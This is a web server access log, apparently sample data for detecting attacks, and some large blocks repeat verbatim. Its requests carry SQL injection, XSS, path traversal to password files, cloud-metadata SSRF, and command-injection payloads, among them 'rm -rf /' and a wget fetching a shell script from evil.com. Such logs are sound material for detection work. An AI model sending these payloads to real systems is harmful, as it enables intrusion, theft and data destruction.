127.0.0.1 - - [01/Aug/2025:09:00:00 +0700] "GET /index.php?id=1 OR 1=1 HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:01:00 +0700] "GET /search.php?q=<script>alert(1)</script> HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:02:00 +0700] "GET /../../etc/passwd HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:03:00 +0700] "GET /admin.php?cmd=rm%20-rf%20/ HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:04:00 +0700] "POST /login.php HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:05:00 +0700] "POST /login.php HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:05:30 +0700] "POST /login.php HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:06:00 +0700] "GET /?q=%27%20or%20%271%27=%271 HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:07:00 +0700] "GET /search?q=1';DROP TABLE users;-- HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:08:00 +0700] "GET /products?item=book;shutdown-- HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:09:00 +0700] "GET /index.php?id=1%27%20or%201=1-- HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:10:00 +0700] "GET /admin?user=admin'-- HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:11:00 +0700] "GET /user.php?id=5;DROP TABLE members; HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:12:00 +0700] "GET /api?search=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:13:00 +0700] "GET /search.php?q=<IMG SRC=javascript:alert('XSS')> HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:14:00 +0700] "GET /page.php?page=../../../../etc/shadow HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:15:00 +0700] "GET /api/data?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:16:00 +0700] "GET /file/download?file=../../../../boot.ini HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:17:00 +0700] "GET /profile?id=../admin HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:18:00 +0700] "GET /login?redirect=http://evil.com HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:19:00 +0700] "GET /config.php.bak HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:20:00 +0700] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:21:00 +0700] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:22:00 +0700] "GET /index.php?page=http://evil.com/shell.txt HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:23:00 +0700] "GET /app_dev.php?token=123&file=../../../../etc/shadow HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:24:00 +0700] "GET /backup.tar.gz HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:25:00 +0700] "GET /debug?cmd=ls%20-al%20/ HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:26:00 +0700] "GET /images.php?img=<svg onload=alert(1)> HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:27:00 +0700] "GET /test.php?input=../../../../windows/win.ini HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:28:00 +0700] "GET /shop?page=union select username,password from users HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:29:00 +0700] "GET /gallery.php?img=../admin/config.php HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:30:00 +0700] "GET /login.php?username=admin&password=' or ''=' HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:31:00 +0700] "GET /data/export?type=csv;wget%20http://evil.com/shell.sh HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:32:00 +0700] "GET /admin/settings?mode=debug;ls%20-al%20/ HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:33:00 +0700] "GET /user/login HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:34:00 +0700] "GET /user/login HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:35:00 +0700] "GET /user/login HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:36:00 +0700] "GET /robots.txt HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:37:00 +0700] "GET /index.html HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:23:57 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:24:08 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:24:10 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:24:42 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:29:48 +0700] "GET / HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:12:01 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:12:04 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:12:06 +0000] "GET /static/style.css HTTP/1.1" 200 321 "-" "Mozilla/5.0"
10.0.0.2 - - [01/Aug/2025:09:13:15 +0000] "GET /index.html HTTP/1.1" 200 3210 "-" "Mozilla/5.0"
10.0.0.3 - - [01/Aug/2025:09:14:12 +0000] "GET /profile?user=admin' OR '1'='1 HTTP/1.1" 200 450 "-" "Mozilla/5.0"  # SQL Injection
172.16.0.5 - - [01/Aug/2025:09:14:22 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 403 "-" "Mozilla/5.0"  # XSS
10.0.0.4 - - [01/Aug/2025:09:15:55 +0000] "GET /../../etc/passwd HTTP/1.1" 403 99 "-" "Mozilla/5.0"  # Directory Traversal
192.168.1.10 - - [01/Aug/2025:09:16:03 +0000] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:16:10 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.11 - - [01/Aug/2025:09:17:22 +0000] "GET /api/data HTTP/1.1" 200 1420 "-" "Mozilla/5.0"
172.16.0.2 - - [01/Aug/2025:09:17:32 +0000] "GET /profile?id=1 UNION SELECT password FROM users HTTP/1.1" 200 450 "-" "Mozilla/5.0"  # SQL Injection
10.0.0.7 - - [01/Aug/2025:09:18:00 +0000] "GET /?file=../../../../etc/shadow HTTP/1.1" 403 99 "-" "Mozilla/5.0"  # Directory Traversal
10.0.0.8 - - [01/Aug/2025:09:18:15 +0000] "GET /products?id=2' OR 1=1 -- HTTP/1.1" 200 390 "-" "Mozilla/5.0"  # SQL Injection
172.16.0.6 - - [01/Aug/2025:09:19:10 +0000] "GET /contact HTTP/1.1" 200 350 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:19:24 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:19:29 +0000] "GET /about HTTP/1.1" 200 1100 "-" "Mozilla/5.0"
172.16.0.7 - - [01/Aug/2025:09:19:32 +0000] "GET /profile?id=<script>document.cookie</script> HTTP/1.1" 200 380 "-" "Mozilla/5.0"  # XSS
10.0.0.9 - - [01/Aug/2025:09:20:00 +0000] "GET /register HTTP/1.1" 200 1450 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:12:01 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:12:04 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:12:06 +0000] "GET /static/style.css HTTP/1.1" 200 321 "-" "Mozilla/5.0"
10.0.0.2 - - [01/Aug/2025:09:13:15 +0000] "GET /index.html HTTP/1.1" 200 3210 "-" "Mozilla/5.0"
10.0.0.3 - - [01/Aug/2025:09:14:12 +0000] "GET /profile?user=admin' OR '1'='1 HTTP/1.1" 200 450 "-" "Mozilla/5.0"
172.16.0.5 - - [01/Aug/2025:09:14:22 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 403 "-" "Mozilla/5.0"
10.0.0.4 - - [01/Aug/2025:09:15:55 +0000] "GET /../../etc/passwd HTTP/1.1" 403 99 "-" "Mozilla/5.0"
192.168.1.10 - - [01/Aug/2025:09:16:03 +0000] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:16:10 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.11 - - [01/Aug/2025:09:17:22 +0000] "GET /api/data HTTP/1.1" 200 1420 "-" "Mozilla/5.0"
172.16.0.2 - - [01/Aug/2025:09:17:32 +0000] "GET /profile?id=1 UNION SELECT password FROM users HTTP/1.1" 200 450 "-" "Mozilla/5.0"
10.0.0.7 - - [01/Aug/2025:09:18:00 +0000] "GET /?file=../../../../etc/shadow HTTP/1.1" 403 99 "-" "Mozilla/5.0"
10.0.0.8 - - [01/Aug/2025:09:18:15 +0000] "GET /products?id=2' OR 1=1 -- HTTP/1.1" 200 390 "-" "Mozilla/5.0"
172.16.0.6 - - [01/Aug/2025:09:19:10 +0000] "GET /contact HTTP/1.1" 200 350 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:19:24 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:19:29 +0000] "GET /about HTTP/1.1" 200 1100 "-" "Mozilla/5.0"
172.16.0.7 - - [01/Aug/2025:09:19:32 +0000] "GET /profile?id=<script>document.cookie</script> HTTP/1.1" 200 380 "-" "Mozilla/5.0"
10.0.0.9 - - [01/Aug/2025:09:20:00 +0000] "GET /register HTTP/1.1" 200 1450 "-" "Mozilla/5.0"
192.168.1.20 - - [01/Aug/2025:09:20:14 +0000] "POST /reset-password HTTP/1.1" 200 800 "-" "Mozilla/5.0"
172.16.0.8 - - [01/Aug/2025:09:20:23 +0000] "GET /?cmd=cat%20/etc/passwd HTTP/1.1" 403 89 "-" "Mozilla/5.0"
10.0.0.10 - - [01/Aug/2025:09:21:10 +0000] "GET /cart HTTP/1.1" 200 590 "-" "Mozilla/5.0"
192.168.1.21 - - [01/Aug/2025:09:21:24 +0000] "GET /products?id=5 HTTP/1.1" 200 410 "-" "Mozilla/5.0"
10.0.0.11 - - [01/Aug/2025:09:21:49 +0000] "POST /checkout HTTP/1.1" 200 1850 "-" "Mozilla/5.0"
172.16.0.9 - - [01/Aug/2025:09:22:03 +0000] "GET /?input=<img src=x onerror=alert(1)> HTTP/1.1" 200 300 "-" "Mozilla/5.0"
192.168.1.22 - - [01/Aug/2025:09:22:44 +0000] "GET /profile?id=1%20OR%201=1 HTTP/1.1" 200 430 "-" "Mozilla/5.0"
10.0.0.12 - - [01/Aug/2025:09:23:18 +0000] "GET /images/logo.png HTTP/1.1" 200 2560 "-" "Mozilla/5.0"
192.168.1.23 - - [01/Aug/2025:09:23:49 +0000] "POST /api/upload HTTP/1.1" 200 1500 "-" "Mozilla/5.0"
10.0.0.13 - - [01/Aug/2025:09:24:07 +0000] "GET /etc/shadow HTTP/1.1" 403 76 "-" "Mozilla/5.0"
172.16.0.10 - - [01/Aug/2025:09:24:20 +0000] "GET /admin.php?user=admin'-- HTTP/1.1" 200 456 "-" "Mozilla/5.0"
192.168.1.24 - - [01/Aug/2025:09:24:44 +0000] "POST /change-email HTTP/1.1" 200 900 "-" "Mozilla/5.0"
10.0.0.14 - - [01/Aug/2025:09:25:02 +0000] "GET /login.php?username=admin&password=' OR '1'='1 HTTP/1.1" 200 345 "-" "Mozilla/5.0"
172.16.0.11 - - [01/Aug/2025:09:25:33 +0000] "GET /public/<svg/onload=alert(1)> HTTP/1.1" 200 412 "-" "Mozilla/5.0"
10.0.0.15 - - [01/Aug/2025:09:26:15 +0000] "POST /api/login HTTP/1.1" 401 523 "-" "Mozilla/5.0"
192.168.1.25 - - [01/Aug/2025:09:26:43 +0000] "GET /config.php HTTP/1.1" 403 105 "-" "Mozilla/5.0"
10.0.0.16 - - [01/Aug/2025:09:27:01 +0000] "GET /profile?user=test HTTP/1.1" 200 478 "-" "Mozilla/5.0"
172.16.0.12 - - [01/Aug/2025:09:27:24 +0000] "GET /profile?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 400 "-" "Mozilla/5.0"
192.168.1.26 - - [01/Aug/2025:09:27:53 +0000] "POST /api/order HTTP/1.1" 200 1600 "-" "Mozilla/5.0"
10.0.0.17 - - [01/Aug/2025:09:28:12 +0000] "GET /../../../../boot.ini HTTP/1.1" 403 101 "-" "Mozilla/5.0"
172.16.0.13 - - [01/Aug/2025:09:28:44 +0000] "GET /search?term=<iframe%20src='javascript:alert(1)'> HTTP/1.1" 200 315 "-" "Mozilla/5.0"
10.0.0.18 - - [01/Aug/2025:09:29:01 +0000] "GET /reset HTTP/1.1" 200 780 "-" "Mozilla/5.0"
192.168.1.27 - - [01/Aug/2025:09:29:29 +0000] "POST /admin HTTP/1.1" 403 550 "-" "Mozilla/5.0"
192.168.1.27 - - [01/Aug/2025:09:29:29 +0000] "POST /admin HTTP/1.1" 403 550 "-" "Mozilla/5.0"
10.0.0.21 - - [01/Aug/2025:15:45:12 +0000] "GET /profile?id=1' OR '1'='1 HTTP/1.1" 200 510 "-" "Mozilla/5.0"
192.168.1.45 - - [01/Aug/2025:16:12:33 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 432 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:00:00 +0700] "GET /index.php?id=1 OR 1=1 HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:01:00 +0700] "GET /search.php?q=<script>alert(1)</script> HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:02:00 +0700] "GET /../../etc/passwd HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:03:00 +0700] "GET /admin.php?cmd=rm%20-rf%20/ HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:04:00 +0700] "POST /login.php HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:05:00 +0700] "POST /login.php HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:05:30 +0700] "POST /login.php HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:06:00 +0700] "GET /?q=%27%20or%20%271%27=%271 HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:07:00 +0700] "GET /search?q=1';DROP TABLE users;-- HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:08:00 +0700] "GET /products?item=book;shutdown-- HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:09:00 +0700] "GET /index.php?id=1%27%20or%201=1-- HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:10:00 +0700] "GET /admin?user=admin'-- HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:11:00 +0700] "GET /user.php?id=5;DROP TABLE members; HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:12:00 +0700] "GET /api?search=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:13:00 +0700] "GET /search.php?q=<IMG SRC=javascript:alert('XSS')> HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:14:00 +0700] "GET /page.php?page=../../../../etc/shadow HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:15:00 +0700] "GET /api/data?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:16:00 +0700] "GET /file/download?file=../../../../boot.ini HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:17:00 +0700] "GET /profile?id=../admin HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:18:00 +0700] "GET /login?redirect=http://evil.com HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:19:00 +0700] "GET /config.php.bak HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:20:00 +0700] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:21:00 +0700] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:22:00 +0700] "GET /index.php?page=http://evil.com/shell.txt HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:23:00 +0700] "GET /app_dev.php?token=123&file=../../../../etc/shadow HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:24:00 +0700] "GET /backup.tar.gz HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:25:00 +0700] "GET /debug?cmd=ls%20-al%20/ HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:26:00 +0700] "GET /images.php?img=<svg onload=alert(1)> HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:27:00 +0700] "GET /test.php?input=../../../../windows/win.ini HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:28:00 +0700] "GET /shop?page=union select username,password from users HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:29:00 +0700] "GET /gallery.php?img=../admin/config.php HTTP/1.1" 404
127.0.0.1 - - [01/Aug/2025:09:30:00 +0700] "GET /login.php?username=admin&password=' or ''=' HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:31:00 +0700] "GET /data/export?type=csv;wget%20http://evil.com/shell.sh HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:32:00 +0700] "GET /admin/settings?mode=debug;ls%20-al%20/ HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:33:00 +0700] "GET /user/login HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:34:00 +0700] "GET /user/login HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:35:00 +0700] "GET /user/login HTTP/1.1" 401
127.0.0.1 - - [01/Aug/2025:09:36:00 +0700] "GET /robots.txt HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:37:00 +0700] "GET /index.html HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:23:57 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:24:08 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:24:10 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:24:42 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:29:48 +0700] "GET / HTTP/1.1" 200
127.0.0.1 - - [01/Aug/2025:09:12:01 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:12:04 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:12:06 +0000] "GET /static/style.css HTTP/1.1" 200 321 "-" "Mozilla/5.0"
10.0.0.2 - - [01/Aug/2025:09:13:15 +0000] "GET /index.html HTTP/1.1" 200 3210 "-" "Mozilla/5.0"
10.0.0.3 - - [01/Aug/2025:09:14:12 +0000] "GET /profile?user=admin' OR '1'='1 HTTP/1.1" 200 450 "-" "Mozilla/5.0"  # SQL Injection
172.16.0.5 - - [01/Aug/2025:09:14:22 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 403 "-" "Mozilla/5.0"  # XSS
10.0.0.4 - - [01/Aug/2025:09:15:55 +0000] "GET /../../etc/passwd HTTP/1.1" 403 99 "-" "Mozilla/5.0"  # Directory Traversal
192.168.1.10 - - [01/Aug/2025:09:16:03 +0000] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:16:10 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.11 - - [01/Aug/2025:09:17:22 +0000] "GET /api/data HTTP/1.1" 200 1420 "-" "Mozilla/5.0"
172.16.0.2 - - [01/Aug/2025:09:17:32 +0000] "GET /profile?id=1 UNION SELECT password FROM users HTTP/1.1" 200 450 "-" "Mozilla/5.0"  # SQL Injection
10.0.0.7 - - [01/Aug/2025:09:18:00 +0000] "GET /?file=../../../../etc/shadow HTTP/1.1" 403 99 "-" "Mozilla/5.0"  # Directory Traversal
10.0.0.8 - - [01/Aug/2025:09:18:15 +0000] "GET /products?id=2' OR 1=1 -- HTTP/1.1" 200 390 "-" "Mozilla/5.0"  # SQL Injection
172.16.0.6 - - [01/Aug/2025:09:19:10 +0000] "GET /contact HTTP/1.1" 200 350 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:19:24 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:19:29 +0000] "GET /about HTTP/1.1" 200 1100 "-" "Mozilla/5.0"
172.16.0.7 - - [01/Aug/2025:09:19:32 +0000] "GET /profile?id=<script>document.cookie</script> HTTP/1.1" 200 380 "-" "Mozilla/5.0"  # XSS
10.0.0.9 - - [01/Aug/2025:09:20:00 +0000] "GET /register HTTP/1.1" 200 1450 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:12:01 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:12:04 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:12:06 +0000] "GET /static/style.css HTTP/1.1" 200 321 "-" "Mozilla/5.0"
10.0.0.2 - - [01/Aug/2025:09:13:15 +0000] "GET /index.html HTTP/1.1" 200 3210 "-" "Mozilla/5.0"
10.0.0.3 - - [01/Aug/2025:09:14:12 +0000] "GET /profile?user=admin' OR '1'='1 HTTP/1.1" 200 450 "-" "Mozilla/5.0"
172.16.0.5 - - [01/Aug/2025:09:14:22 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 403 "-" "Mozilla/5.0"
10.0.0.4 - - [01/Aug/2025:09:15:55 +0000] "GET /../../etc/passwd HTTP/1.1" 403 99 "-" "Mozilla/5.0"
192.168.1.10 - - [01/Aug/2025:09:16:03 +0000] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:16:10 +0000] "POST /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.11 - - [01/Aug/2025:09:17:22 +0000] "GET /api/data HTTP/1.1" 200 1420 "-" "Mozilla/5.0"
172.16.0.2 - - [01/Aug/2025:09:17:32 +0000] "GET /profile?id=1 UNION SELECT password FROM users HTTP/1.1" 200 450 "-" "Mozilla/5.0"
10.0.0.7 - - [01/Aug/2025:09:18:00 +0000] "GET /?file=../../../../etc/shadow HTTP/1.1" 403 99 "-" "Mozilla/5.0"
10.0.0.8 - - [01/Aug/2025:09:18:15 +0000] "GET /products?id=2' OR 1=1 -- HTTP/1.1" 200 390 "-" "Mozilla/5.0"
172.16.0.6 - - [01/Aug/2025:09:19:10 +0000] "GET /contact HTTP/1.1" 200 350 "-" "Mozilla/5.0"
127.0.0.1 - - [01/Aug/2025:09:19:24 +0000] "GET /home HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
192.168.1.3 - - [01/Aug/2025:09:19:29 +0000] "GET /about HTTP/1.1" 200 1100 "-" "Mozilla/5.0"
172.16.0.7 - - [01/Aug/2025:09:19:32 +0000] "GET /profile?id=<script>document.cookie</script> HTTP/1.1" 200 380 "-" "Mozilla/5.0"
10.0.0.9 - - [01/Aug/2025:09:20:00 +0000] "GET /register HTTP/1.1" 200 1450 "-" "Mozilla/5.0"
192.168.1.20 - - [01/Aug/2025:09:20:14 +0000] "POST /reset-password HTTP/1.1" 200 800 "-" "Mozilla/5.0"
172.16.0.8 - - [01/Aug/2025:09:20:23 +0000] "GET /?cmd=cat%20/etc/passwd HTTP/1.1" 403 89 "-" "Mozilla/5.0"
10.0.0.10 - - [01/Aug/2025:09:21:10 +0000] "GET /cart HTTP/1.1" 200 590 "-" "Mozilla/5.0"
192.168.1.21 - - [01/Aug/2025:09:21:24 +0000] "GET /products?id=5 HTTP/1.1" 200 410 "-" "Mozilla/5.0"
10.0.0.11 - - [01/Aug/2025:09:21:49 +0000] "POST /checkout HTTP/1.1" 200 1850 "-" "Mozilla/5.0"
172.16.0.9 - - [01/Aug/2025:09:22:03 +0000] "GET /?input=<img src=x onerror=alert(1)> HTTP/1.1" 200 300 "-" "Mozilla/5.0"
192.168.1.22 - - [01/Aug/2025:09:22:44 +0000] "GET /profile?id=1%20OR%201=1 HTTP/1.1" 200 430 "-" "Mozilla/5.0"
10.0.0.12 - - [01/Aug/2025:09:23:18 +0000] "GET /images/logo.png HTTP/1.1" 200 2560 "-" "Mozilla/5.0"
192.168.1.23 - - [01/Aug/2025:09:23:49 +0000] "POST /api/upload HTTP/1.1" 200 1500 "-" "Mozilla/5.0"
10.0.0.13 - - [01/Aug/2025:09:24:07 +0000] "GET /etc/shadow HTTP/1.1" 403 76 "-" "Mozilla/5.0"
172.16.0.10 - - [01/Aug/2025:09:24:20 +0000] "GET /admin.php?user=admin'-- HTTP/1.1" 200 456 "-" "Mozilla/5.0"
192.168.1.24 - - [01/Aug/2025:09:24:44 +0000] "POST /change-email HTTP/1.1" 200 900 "-" "Mozilla/5.0"
10.0.0.14 - - [01/Aug/2025:09:25:02 +0000] "GET /login.php?username=admin&password=' OR '1'='1 HTTP/1.1" 200 345 "-" "Mozilla/5.0"
172.16.0.11 - - [01/Aug/2025:09:25:33 +0000] "GET /public/<svg/onload=alert(1)> HTTP/1.1" 200 412 "-" "Mozilla/5.0"
10.0.0.15 - - [01/Aug/2025:09:26:15 +0000] "POST /api/login HTTP/1.1" 401 523 "-" "Mozilla/5.0"
192.168.1.25 - - [01/Aug/2025:09:26:43 +0000] "GET /config.php HTTP/1.1" 403 105 "-" "Mozilla/5.0"
10.0.0.16 - - [01/Aug/2025:09:27:01 +0000] "GET /profile?user=test HTTP/1.1" 200 478 "-" "Mozilla/5.0"
172.16.0.12 - - [01/Aug/2025:09:27:24 +0000] "GET /profile?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 400 "-" "Mozilla/5.0"
192.168.1.26 - - [01/Aug/2025:09:27:53 +0000] "POST /api/order HTTP/1.1" 200 1600 "-" "Mozilla/5.0"
10.0.0.17 - - [01/Aug/2025:09:28:12 +0000] "GET /../../../../boot.ini HTTP/1.1" 403 101 "-" "Mozilla/5.0"
172.16.0.13 - - [01/Aug/2025:09:28:44 +0000] "GET /search?term=<iframe%20src='javascript:alert(1)'> HTTP/1.1" 200 315 "-" "Mozilla/5.0"
10.0.0.18 - - [01/Aug/2025:09:29:01 +0000] "GET /reset HTTP/1.1" 200 780 "-" "Mozilla/5.0"
192.168.1.27 - - [01/Aug/2025:09:29:29 +0000] "POST /admin HTTP/1.1" 403 550 "-" "Mozilla/5.0"
192.168.1.27 - - [01/Aug/2025:09:29:29 +0000] "POST /admin HTTP/1.1" 403 550 "-" "Mozilla/5.0"
10.0.0.21 - - [01/Aug/2025:15:45:12 +0000] "GET /profile?id=1' OR '1'='1 HTTP/1.1" 200 510 "-" "Mozilla/5.0"
192.168.1.45 - - [01/Aug/2025:16:12:33 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 432 "-" "Mozilla/5.0"
192.168.2.6 - - [01/Aug/2025:20:49:28 +0700] "GET / HTTP/1.1" 200
192.168.2.6 - - [01/Aug/2025:20:49:28 +0700] "GET / HTTP/1.1" 200

192.168.1.27 - - [01/Aug/2025:09:29:29 +0000] "POST /admin HTTP/1.1" 403 550 "-" "Mozilla/5.0"